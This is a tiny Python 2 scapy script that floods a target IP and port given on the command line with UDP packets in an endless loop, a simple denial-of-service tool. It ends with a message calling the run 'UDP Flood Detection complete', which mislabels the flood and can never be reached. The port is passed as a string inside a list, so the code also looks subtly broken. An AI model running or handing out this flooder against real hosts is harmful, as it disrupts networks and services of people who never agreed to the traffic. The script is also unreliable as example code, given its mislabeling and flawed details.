import sys
from scapy.all import *
if len(sys.argv)!=3:
    print "Usage: {} dst_ip dst_port".format(sys.argv[0])
    exit(1)

pkt = IP(dst=sys.argv[1])/UDP(dport=[sys.argv[2]])

send(pkt,loop=1)
print "UDP Flood Detection complete"